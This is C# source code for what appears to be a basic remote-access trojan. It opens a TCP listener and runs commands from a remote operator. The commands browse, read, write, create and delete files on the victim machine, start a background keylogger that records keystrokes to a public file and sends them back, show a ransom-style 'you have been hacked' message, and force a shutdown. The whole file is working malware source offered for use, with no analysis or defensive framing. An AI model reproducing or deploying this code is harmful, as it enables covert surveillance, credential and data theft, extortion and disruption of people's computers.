using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace WindowsFormsApplication2
{

    static class Program
    {
        static String log = String.Empty;
        static Boolean run = true;

        //Keylogger function here
        static void StartLogging()
        {
                //Creates a thread that runs the keylogger in the background
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    Thread.Sleep(10);
                    while (run == true)
                    {
                        for (Int32 i = 0; i < 255; i++)
                        {
                            int keyState = GetAsyncKeyState(i);
                            if (keyState == 1 || keyState == -32767)
                            {
                                Console.WriteLine((Keys)i);
                                log += " " + ((Keys)i);
                                Console.WriteLine(log);
                                System.IO.File.WriteAllText(@"C:\Users\Public\log.txt", log);
                                break;
                            }
                        }
                    }

                }).Start();
        }
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [STAThread]
        static void Main()
        {

            String data = null;
            // Data buffer for incoming data.
            byte[] bytes = new Byte[1024];

            // Establish the local endpoint for the socket.
            // Dns.GetHostName returns the name of the 
            // host running the application.
            IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipAddress = ipHostInfo.AddressList[0];
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, 9988);

            // Create a TCP/IP socket.
            Socket listener = new Socket(AddressFamily.InterNetwork,
                SocketType.Stream, ProtocolType.Tcp);

            // Bind the socket to the local endpoint and 
            // listen for incoming connections.
            try
            {
                listener.Bind(localEndPoint);
                listener.Listen(9988);

                // Start listening for connections.
                while (true)
                {
                    Console.WriteLine("Waiting for a connection...");
                    // Program is suspended while waiting for an incoming connection.
                    Socket handler = listener.Accept();
                    data = null;
                    int i = 0;
                    String log = String.Empty;
                    DirectoryInfo direc = new DirectoryInfo(".");
                    String filepath = direc.ToString();

                    // An incoming connection needs to be processed.
                    while (true)
                    {
                        //Recieves the data from the client
                        Console.WriteLine("Recieving Data");
                        bytes = new byte[1024];
                        int bytesRec = handler.Receive(bytes);
                        
                        //Converts back from bytes
                        data += Encoding.ASCII.GetString(bytes, 0, bytesRec);
                        if (data.IndexOf("<EOF>") > -1)
                        {
                            break;
                        }
                        i++;
                        if (bytesRec != 0)
                        {
                            Console.WriteLine("Data Recieved");
                            Console.WriteLine("Text received : {0}", data);
                            try
                            {

                                //Interpret command by seperating ID from the Command
                                String Id = data.Substring(0, 1);
                                String command = data.Substring(2, data.Length - 2);
                                

                                if (Id == "1" && command == "list") //List the directories under the current directory
                                {
                                    data = "";
                                    DirectoryInfo direcx = new DirectoryInfo(filepath);
                                    DirectoryInfo[] direcArr = direcx.GetDirectories();
                                    foreach (DirectoryInfo dri in direcArr)
                                    {
                                        String direcdata = " " + dri.ToString();
                                        data += " " + direcdata;
                                        Console.WriteLine(dri.Name);
                                    }
                                }
                                else if (Id == "1" && command == "files") //Lists the files under the current directorys
                                {
                                    try
                                    {
                                        String[] Files = Directory.GetFiles(filepath);
                                        foreach (String File in Files)
                                        {
                                            data += " " + Path.GetFileName(File);
                                        }
                                    } catch
                                    {
                                        data = "Could Not List Files";
                                    }
                                }
                                else if (Id == "1" && command == "direc")//Shows the current directory
                                {
                                    try
                                    {
                                        data = filepath;
                                    } catch
                                    {
                                        data = "Could not show filepath";
                                    }
                                }
                                else if (Id == "2") //Directory Up One "CD .."
                                {
                                    try
                                    {
                                        DirectoryInfo newdirec = System.IO.Directory.GetParent(filepath);
                                        String parentdirec = newdirec.ToString();
                                        filepath = parentdirec;
                                        
                                        data = "Directory changed to: " + filepath;
                                        Console.WriteLine(filepath);

                                    } catch (Exception E)
                                    {
                                        Console.WriteLine(E);
                                        data = "Could not change directories";
                                    }
                                }
                                else if (Id == "3") //Directory Down
                                {
                                    try
                                    {
                                        if (Directory.Exists(filepath + command) == true)
                                        {
                                            filepath = filepath + command;
                                            data = "Now In Directory: " + filepath;
                                        } else
                                        {
                                            data = "That directory does not exist";
                                        }
                                    } catch
                                    {
                                        data = "Directory not changed";
                                    }
                                }
                                else if (Id == "4") //Create a file
                                {
                                    try {
                                        String path = filepath;
                                        String filePath = path +" "+ command;
                                        File.Create(filePath);
                                        Console.WriteLine("File successfuly Created");
                                        data = "File Successfuly Created";
                                    } catch
                                    {
                                        Console.WriteLine("Could not create file");
                                        data = "Could not create file";
                                    }
                                }
                                else if (Id == "5") //Delete a file
                                {
                                    try
                                    {
                                        String path = filepath;
                                        String filePath = path + " " + command;
                                        File.Delete(filePath);
                                        Console.WriteLine("File Successfuly Deleted");
                                        data = "File Successfuly Deleted";
                                    } catch
                                    {
                                        Console.WriteLine("File not deleted");
                                    }
                                }
                                else if (Id == "6") // Read a file
                                {
                                    try
                                    {
                                        String path = filepath;
                                        String filePath = path + " " + command;
                                        int e = 0;

                                        string[] lines = System.IO.File.ReadAllLines(filePath);
                                        while (e < lines.Length)
                                        {
                                            data = data + lines[e] + " ";
                                            e++;
                                        }
                                        Console.WriteLine("File Successfuly Read");
                                    } catch
                                    {
                                        Console.WriteLine("File could not be read");
                                    }
                                }
                                else if (Id == "7") // Write to file
                                {
                                    try
                                    {
                                        String[] stuff = command.Split('|');
                                        String fileName = filepath + stuff[0];
                                        String fileData = stuff[1];
                                        if (File.Exists(fileName) == true)
                                        {
                                            System.IO.File.WriteAllText(fileName, fileData);
                                            data = "Successfully wrote to file";
                                        } else
                                        {
                                            data = "File does not exist";
                                        }
                                    } catch
                                    {
                                        data = "Could not write to file";
                                    }
                                }
                                else if (Id == "8") //Access Keylogger
                                {
                                    Console.WriteLine("Accessing Keylogger");
                                    if (command == "1")
                                    {
                                        Console.WriteLine("Turning on keylogger");
                                        //hook = new UserActivityHook(false, false);
                                        run = true;
                                        StartLogging();
                                        data = "Keylogger Turned On";
                                    }
                                    else if (command == "2")
                                    {
                                        run = false;
                                        data = "Keylogger turned off";

                                    }
                                    else if (command == "3")
                                    {
                                        Console.WriteLine(log);
                                        data = System.IO.File.ReadAllText(@"C:\Users\Public\log.txt");
                                    }
                                }
                                else if (Id == "0" && command == "extort") //Extortion
                                {
                                    string message = "You have been hacked!! Gimme all of your moneys";
                                    string caption = "Error Code 53";
                                    MessageBoxButtons buttons = MessageBoxButtons.YesNo;
                                    DialogResult result;

                                    // Displays the MessageBox.

                                    result = MessageBox.Show(message, caption, buttons);
                                }
                                else if (Id == "9" && command == "kill") //Reboot Machine
                                {
                                    var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                                    psi.CreateNoWindow = true;
                                    psi.UseShellExecute = false;
                                    Process.Start(psi);
                                }
                            }
                            catch (Exception E)
                            {
                                Console.WriteLine("No data sent");
                                Console.WriteLine(E);
                            }


                            // Echo the data back to the client. This is where we send a response
                            byte[] msg = Encoding.ASCII.GetBytes(data);

                            handler.Send(msg);
                            data = null;
                           // handler.Shutdown(SocketShutdown.Both);
                           // handler.Close();
                        }
                    }

                }

            } catch (Exception e) {
                Console.WriteLine(e.ToString());
            }

            Console.WriteLine("\nPress ENTER to continue...");
            Console.Read();

        } 

    }

}


